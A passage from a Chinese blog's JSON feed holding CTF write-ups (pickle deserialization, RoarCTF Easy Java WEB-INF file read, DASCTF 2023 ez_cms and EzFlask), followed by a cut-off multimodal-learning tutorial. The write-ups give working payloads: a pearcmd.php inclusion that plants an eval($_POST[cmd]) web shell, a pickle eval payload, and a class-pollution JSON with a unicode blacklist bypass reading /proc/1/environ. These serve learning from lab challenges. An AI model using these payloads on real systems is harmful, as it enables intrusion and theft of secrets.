class=\"line\"></span><br><span class=\"line\">a=exp() <span class=\"comment\"># 创建exp类实例</span></span><br><span class=\"line\"></span><br><span class=\"line\">s=pickle.dumps(a,protocol=<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\"># 这行将a对象序列化为字节流，并将其存储在变量s中。在这里，protocol=0表示使用最早的pickle协议版本。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(urllib.parse.quote(s)) <span class=\"comment\"># url编码</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 结果：c__builtin__%0Aeval%0Ap0%0A%28Vopen%28%27/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>把这一串 payload 赋值给 become 参数，Bp 发包即可获得返回的 flag</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf6e971ddac507cc6ab393.jpg\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"roarctf-2019easy-java\"><a class=\"markdownIt-Anchor\" href=\"#roarctf-2019easy-java\">#</a> [RoarCTF 2019]Easy Java</h2>\n<ul>\n<li>考点：\n<ul>\n<li>任意文件读取</li>\n<li>Java Web 应用程序的安全目录</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>\n<p>进入界面，发现是简单的登录界面，直接点 help 查看是什么</p>\n<p><img src=\"https://pic.imgdb.cn/item/64e32eb8661c6c8e54e4cafa.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>显示找不到这个 help.docx 的下载文件，但很明显能从 URL： <code>http://9e0d4553-c58c-4914-aa7a-776b2e8b8794.node4.buuoj.cn:81/Download?filename=help.docx</code>  看出东西</p>\n<p><img src=\"https://pic.imgdb.cn/item/64e32f40661c6c8e54e67f76.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>从 URL 怀疑存在任意文件读取漏洞，但是这里却返回错误信息，换个方式抓包用 POST 下载，成功返回信息：</p>\n<p><img src=\"https://pic.imgdb.cn/item/64e3307b661c6c8e54ea5c6e.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>这是一道与 JAVA 有关的题目，不得不提下面几点信息：</p>\n<blockquote>\n<p><strong>WEB-INF 是 Java Web 应用程序的安全目录</strong>。在 Java Web 应用中，WEB-INF 目录位于 Web 应用程序的根目录下，包含了一些重要的资源和文件，这些文件对外部用户不可见。主要包括以下几个子目录和文件：</p>\n<ol>\n<li><u>WEB-INF/classes</u>：该目录用于存放 Web 应用程序的.class 文件和其他资源文件。</li>\n<li><u>WEB-INF/lib</u>：该目录用于存放 Web 应用程序所需的第三方库和依赖的 JAR 文件。</li>\n<li><u>WEB-INF/web.xml</u>：这是一个配置文件，用于配置 Web 应用程序的部署描述和初始化参数。</li>\n<li><u>WEB-INF/tags</u>：该目录用于存放自定义标签文件。</li>\n<li><u>WEB-INF/src</u>：源码目录，按照包名结构放置各个 java 文件。</li>\n<li><u>WEB-INF/database.properties</u>：数据库配置文件</li>\n</ol>\n<p>由于 WEB-INF 目录对外部访问不可见，因此可以将一些敏感的资源文件放在其中，以保护 Web 应用程序的安全性。</p>\n</blockquote>\n</li>\n<li>\n<p>于是访问 WEB-INF/web.xml 配置文件，发现 flag 配置信息</p>\n<p><img src=\"https://pic.imgdb.cn/item/64e33120661c6c8e54eccd75.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>继续根据这个信息读取 / WEB-INF/classes/com/wm/ctf/FlagController.class，注意最后的 <code>.class</code>  需要自行添加上去</p>\n<p><img src=\"https://pic.imgdb.cn/item/64e335d6661c6c8e54fcc5bf.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>把红框中的 base64 拿去解密，即可得到 flag</p>\n<p><code>flag&#123;127ac0b8-494e-4f2c-89ba-5d95d0285dae&#125;</code></p>\n</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "http://aer0liteee.github.io/post/44ee844e.html",
            "url": "http://aer0liteee.github.io/post/44ee844e.html",
            "title": "DASCTF-2023-0X401--WP",
            "date_published": "2023-08-06T08:39:08.000Z",
            "content_html": "<h1 id=\"dasctf-2023-0x401wp\"><a class=\"markdownIt-Anchor\" href=\"#dasctf-2023-0x401wp\">#</a> DASCTF 2023 &amp; 0X401—WP</h1>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h2>\n<h3 id=\"ez_cms\"><a class=\"markdownIt-Anchor\" href=\"#ez_cms\">#</a> ez_cms</h3>\n<h4 id=\"考点弱口令登入后台pearcmd文件包含\"><a class=\"markdownIt-Anchor\" href=\"#考点弱口令登入后台pearcmd文件包含\">#</a> 考点：弱口令登入后台，pearcmd 文件包含</h4>\n<ol>\n<li>\n<p>熊海 CMS</p>\n</li>\n<li>\n<p>弱口令登入后台，用户名 admin，抓包放 Intruder 直接爆</p>\n<p><img src=\"https://pic.imgdb.cn/item/64bfed4e1ddac507cc95d42e.png\" alt=\"\"></p>\n</li>\n<li>\n<p>网上很多教程，直接搜，主要利用文件包含漏洞</p>\n<p>漏洞文件 ：<u>/index.php</u>和<u>/admin/index.php</u>，两处代码一样，因此只用分析一处即可，这里分析根目录下的 index.php 文件，源码如下 ：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"comment\">//单一入口模式 </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>); <span class=\"comment\">//关闭错误显示 </span></span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;r&#x27;</span>]); <span class=\"comment\">//接收文件名 </span></span><br><span class=\"line\"><span class=\"variable\">$action</span>=<span class=\"variable\">$file</span>==<span class=\"string\">&#x27;&#x27;</span>?<span class=\"string\">&#x27;index&#x27;</span>:<span class=\"variable\">$file</span>; <span class=\"comment\">//判断为空或者等于</span></span><br><span class=\"line\">index <span class=\"keyword\">include</span>(<span class=\"string\">&#x27;files/&#x27;</span>.<span class=\"variable\">$action</span>.<span class=\"string\">&#x27;.php&#x27;</span>); <span class=\"comment\">//载入相应文件 </span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>接下来配合 pearcmd.php 传一句话木马 Getshell</p>\n<p>​\t<strong>重点确定 pearcmd.php 的位置！</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pearcmd.php常见位置</span><br><span class=\"line\"></span><br><span class=\"line\">·/usr/local/lib/php</span><br><span class=\"line\"></span><br><span class=\"line\">·/usr/share/php/pearcmd.php</span><br><span class=\"line\"></span><br><span class=\"line\">·/usr/local/bin/pearcmd.php</span><br></pre></td></tr></table></figure>\n<p>Bp 抓包一个一个试，发现第二个回显正确</p>\n<p><img src=\"https://pic.imgdb.cn/item/64bfeefa1ddac507cc989a08.jpg\" alt=\"\"></p>\n<p>Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://ip/admin/index.php?+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[cmd]);?&gt;+../../../../../../../../tmp/1.php</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>蚁剑连 / 直接网页访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://ip/admin/index.php?r=../../../../../../../../../../../../tmp/1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://pic.imgdb.cn/item/64bff0081ddac507cc9a5be4.jpg\" alt=\"\"></p>\n<p>・flag 在根目录下 /flag_you_find_ya</p>\n<h3 id=\"ezflask\"><a class=\"markdownIt-Anchor\" href=\"#ezflask\">#</a> EzFlask</h3>\n<h4 id=\"考点python原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#考点python原型链污染\">#</a> 考点：Python 原型链污染</h4>\n</li>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> uuid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, session</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> black_list</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.secret_key = <span class=\"built_in\">str</span>(uuid.uuid4())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> black_list:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">user</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.username = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        self.password = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">self, data</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.username == data[<span class=\"string\">&#x27;username&#x27;</span>] <span class=\"keyword\">and</span> self.password == data[<span class=\"string\">&#x27;password&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">Users = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.data:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(request.data):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            data = json.loads(request.data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;username&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data <span class=\"keyword\">or</span> <span class=\"string\">&quot;password&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">            User = user()</span><br><span class=\"line\">            merge(data, User)</span><br><span class=\"line\">            Users.append(User)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Success&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Register Failed&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.data:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = json.loads(request.data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;username&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data <span class=\"keyword\">or</span> <span class=\"string\">&quot;password&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> Users:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> user.check(data):</span><br><span class=\"line\">                    session[<span class=\"string\">&quot;username&quot;</span>] = data[<span class=\"string\">&quot;username&quot;</span>]</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Success&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Login Failed&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>,methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(__file__, <span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&quot;0.0.0.0&quot;</span>, port=<span class=\"number\">5010</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>有登录和注册两个路由，默认 index 读取__file__</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>,methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(__file__, <span class=\"string\">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>\n<p>回看 merge 函数，明显的 Python 原型链污染</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>分析源码后，发现入口在 /register 路由下的 merge (data, User)，尝试用原型链污染去覆盖</p>\n<p><strong>Payload：</strong></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;123&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"> <span class=\"attr\">&quot;password&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;123&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"> <span class=\"attr\">&quot;__init__&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\"> <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__globals__&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__file__&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;/proc/1/environ&quot;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"> <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>Bp 发包进行注册，返回 Register falied，回去看源码发现 check 函数可能存在黑名单过滤，__init__被 ban，在 check 进行一次 json.loads，而 json 识别 unicode，因此考虑 unicode 编码绕过</p>\n<p><strong>Payload：</strong></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;123&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"> <span class=\"attr\">&quot;password&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;123&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"> <span class=\"attr\">&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\"> <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__globals__&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__file__&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;/proc/1/environ&quot;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"> <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>发包，成功</p>\n<p><img src=\"https://pic.imgdb.cn/item/64c391cb1ddac507cc6412c0.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>返回题目主页面发包，看到 flag：</p>\n<p><img src=\"https://pic.imgdb.cn/item/64c3933a1ddac507cc66c364.jpg\" alt=\"\"></p>\n</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "http://aer0liteee.github.io/post/bdbefb72.html",
            "url": "http://aer0liteee.github.io/post/bdbefb72.html",
            "title": "MML",
            "date_published": "2023-07-16T14:44:07.000Z",
            "content_html": "<h1 id=\"多模态学习multimodal-learning\"><a class=\"markdownIt-Anchor\" href=\"#多模态学习multimodal-learning\">#</a> 多模态学习 (MultiModal Learning)</h1>\n<h2 id=\"定义\"><a class=\"markdownIt-Anchor\" href=\"#定义\">#</a> 定义</h2>\n<p><strong><u>多模态机器学习</u></strong>，英文全称 MultiModal Machine Learning (MMML)</p>\n<h3 id=\"模态\"><a class=\"markdownIt-Anchor\" href=\"#模态\">#</a> 模态</h3>\n<p>​\t\t<strong>模态</strong>，是指一些表达或感知事物的方式，每一种<u>信息的来源或者形式</u>，都可以称为一种模态。例如，人有触觉，听觉，视觉，嗅觉；信息的媒介，有语音、视频、文字等；多种多样的传感器，如雷达、红外、加速度计等，以上的每一种都可以称为一种模态。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051318189.png\" alt=\"What is Mulimodel\"></p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  \t<strong><u>感知模态</u></strong></p>\n<ul>\n<li>​\t\t我们生活在一个由多种模态（Multimodal）信息构成的世界，包括<strong>视觉信息、听觉信息、文本信息、嗅觉信息</strong>等等，当研究的问题或者数据集包含多种这样的模态信息时我们称之为多模态问题，研究多模态问题是推动人工智能更好的了解和认知我们周围世界的关键。</li>\n</ul>\n<blockquote>\n<p>相较于图像、语音、文本等多媒体 (Multi-media) 数据划分形式，“模态” 是一个更为细粒度的概念，<strong>同一媒介下可存在不同的模态</strong>。</p>\n<p>比如我们可以把<u>两种不同的语言当做是两种模态</u>，甚至在<u>两种不同情况下采集到的数据集</u>，亦可认为是两种模态。</p>\n</blockquote>\n<h3 id=\"多模态\"><a class=\"markdownIt-Anchor\" href=\"#多模态\">#</a> 多模态</h3>\n<p>​\t\t<strong>多模态</strong>，即是从多个模态表达或感知事物。 多模态可归类为<u>同质性的模态</u>，例如从两台相机中分别拍摄的图片；<u>异质性的模态</u>，例如图片与文本语言的关系。</p>\n<p>​\t<strong>多模态可能有以下三种形式：</strong></p>\n<ul>\n<li>\n<p><strong>来自不同传感器的同一类媒体数据</strong>。如物联网背景下<u>不同传感器所检测到的同一对象数据</u>等。</p>\n</li>\n<li>\n<p><strong>具有不同的数据结构特点、表示形式的表意符号与信息</strong>。如描述同一对象的结构化、非结构化的数据单元；描述<u>同一数学概念的公式、逻辑符号、函数图及解释性文本</u>等。</p>\n</li>\n<li>\n<p><strong>描述同一对象的多媒体数据</strong>。如互联网环境下描述某一特定对象的<u>视频、图片、语音、文本</u>等信息。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t下图即为典型的多模态信息形式</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211050816652.png\" alt=\"“下雪”场景的多模态数据(图像、音频与文本)\"></p>\n<p>通常主要研究模态包括 &quot;<strong>3V</strong>&quot;：即<strong> Verbal (文本)、Vocal (语音)、Visual (视觉)</strong>。</p>\n<p>​\t人跟人交流时的多模态：</p>\n<ul>\n<li>视觉\n<ul>\n<li>手势：头、眼、手</li>\n<li>肢体语言：体态、空间距离关系</li>\n<li>眼神交流：头、眼</li>\n<li>面部表情：笑容、皱眉……</li>\n</ul>\n</li>\n<li>语言\n<ul>\n<li>韵律：语调、语音质量</li>\n<li>声音：哭、笑……</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051318784.png\" alt=\"multimodal communicative behaviors\"></p>\n<h3 id=\"多模态机器学习\"><a class=\"markdownIt-Anchor\" href=\"#多模态机器学习\">#</a> 多模态机器学习</h3>\n<p>​\t<strong>多模态机器学习</strong>是从多种模态的数据中学习并且提升自身的算法，它不是某一个具体的算法，它是一类算法的总称。</p>\n<p>从<strong>语义感知</strong>的角度切入，多模态数据涉及<strong>不同的感知通道</strong>如视觉、听觉、触觉、嗅觉所接收到的信息；在<strong>数据层面</strong>理解，多模态数据则可被看作<strong>多种数据类型</strong>的组合，如图片、数值、文本、符号、音频、时间序列，或者集合、树、图等不同数据结构所组成的复合数据形式，乃至来自不同数据库、不同知识库的各种信息资源的组合。<strong>对多源异构数据的挖掘分析可被理解为多模态学习</strong>。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051125254.png\" alt=\"多模态学习举例\"></p>\n<p>​\t   将同个对象（同一种数据）的不同输出形式进行多模态学习融合后进行预测</p>\n</li>\n</ul>\n<h2 id=\"发展历史\"><a class=\"markdownIt-Anchor\" href=\"#发展历史\">#</a> 发展历史</h2>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051008371.png\" alt=\"多模态发展的四个时期\"></p>\n<h3 id=\"行为时代\"><a class=\"markdownIt-Anchor\" href=\"#行为时代\">#</a> 行为时代</h3>\n<p>从心理学的角度对多模态这一现象进行剖析。</p>\n<h3 id=\"计算时代\"><a class=\"markdownIt-Anchor\" href=\"#计算时代\">#</a> 计算时代</h3>\n<p>利用一些浅层的模型对多模态问题进行研究，其中代表性的应用包括视觉语音联合识别，多模态情感计算等等。</p>\n<h3 id=\"交互时代\"><a class=\"markdownIt-Anchor\" href=\"#交互时代\">#</a> 交互时代</h3>\n<p>从交互的角度入手，研究多模态识别问题，拟人类多模态交互过程，其中主要的代表作品包括苹果的语音助手 Siri、IDIAP 实验室（瑞士人工智能研究机构）的 AMI 项目（记录会议录音、同步音频视频、转录与注释）等。</p>\n<h3 id=\"深度学习时代\"><a class=\"markdownIt-Anchor\" href=\"#深度学习时代\">#</a> 深度学习时代</h3>\n<p>多模态研究发展迅猛，得益于新的大规模多模态数据集、GPU 快速计算、强大的视觉特征抽取能力、强大的语言特征抽取能力。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211050837453.png\" alt=\"多模态机器学习在Google Trends上的表现\"></p>\n<h2 id=\"典型任务\"><a class=\"markdownIt-Anchor\" href=\"#典型任务\">#</a> 典型任务</h2>\n<h3 id=\"language-audio\"><a class=\"markdownIt-Anchor\" href=\"#language-audio\">#</a> Language-Audio</h3>\n<ul>\n<li>Text-to-Speech Synthesis: 给定文本，生成一段对应的声音。</li>\n<li>Audio Captioning：给定一段语音，生成一句话总结并描述主要内容。(不是语音识别)</li>\n</ul>\n<h3 id=\"vision-audio\"><a class=\"markdownIt-Anchor\" href=\"#vision-audio\">#</a> Vision-Audio</h3>\n<ul>\n<li>\n<p>Speech-conditioned Face generation：给定一段话，生成说话人的视频。</p>\n</li>\n<li>\n<p>Audio-Driven 3D Facial Animation：<u>给定一段话与 3D 人脸模版，生成说话的人脸 3D 动画。</u></p>\n<ul>\n<li>\n<p>​\t\t\t\tApple Vision Pro 头显 + Otter AI 助手：打造全新空间计算体验</p>\n<p><img src=\"https://www.apple.com/v/apple-vision-pro/a/images/overview/hero/portrait_base__bwsgtdddcl7m_large.jpg\" alt=\"Person wearing Vision Pro, with eyes visible through front glass\"></p>\n<p>​\t苹果在 2023 年的全球开发者大会上发布了一款令人惊艳的产品：Vision Pro。</p>\n<p>​\t\t\t超高清的显示屏、先进的空间音频系统、无需手柄的手眼语音交互。</p>\n<p>Otter 是一个基于深度学习的多模态 AI 助手，它可以通过 Vision Pro 头显的摄像头捕捉用户的视觉输入，分析用户的环境、情境和意图，生成相应的反馈和指导。Otter 可以理解用户的语言、手势和眼神，与用户进行自然和流畅的对话，帮助用户完成各种任务和活动。</p>\n<p><img src=\"E:%5C%E6%A1%8C%E9%9D%A2%5CGZ%5C%E5%A4%A7%E4%BA%8C%E4%B8%8B%5C8e6b2a5ce8574900a91d6693d9e5ccc5.gif\" alt=\"img\"></p>\n<p>捕获用户视觉、语音输入特征，根据已采集的人脸面部信息生成说话的人脸 3D 动画</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"vision-language\"><a class=\"markdownIt-Anchor\" href=\"#vision-language\">#</a> Vision-Language</h3>\n<ul>\n<li>Image/Video Captioning (图像 / 视频描述)：给定一个图像 / 视频，生成文本描述其主要内容。</li>\n<li>Vision-and-Language Navigation (视觉 - 语言导航)： 给定自然语言进行指导，使得智能体根据视觉传感器导航到特定的目标。</li>\n</ul>\n<h3 id=\"定位相关任务\"><a class=\"markdownIt-Anchor\" href=\"#定位相关任务\">#</a> 定位相关任务</h3>\n<ul>\n<li>Object Tracking from Natural Language Query: 给定一段视频和一些文本，追踪视频中文本所描述的对象。</li>\n</ul>\n<h3 id=\"更多模态\"><a class=\"markdownIt-Anchor\" href=\"#更多模态\">#</a> 更多模态</h3>\n<ul>\n<li>Affect Computing (情感计算)：使用语音、视觉 (人脸表情)、文本信息、心电、脑电等模态进行情感识别。</li>\n</ul>\n<h2 id=\"核心技术挑战\"><a class=\"markdownIt-Anchor\" href=\"#核心技术挑战\">#</a> 核心技术挑战</h2>\n<p>​                                                 <u>表征</u> <u>翻译</u> <u>对齐</u> <u>融合</u> <u>协同学习</u></p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051339734.png\" alt=\"多模态学习的技术挑战\"></p>\n<h3 id=\"表征representation\"><a class=\"markdownIt-Anchor\" href=\"#表征representation\">#</a> 表征 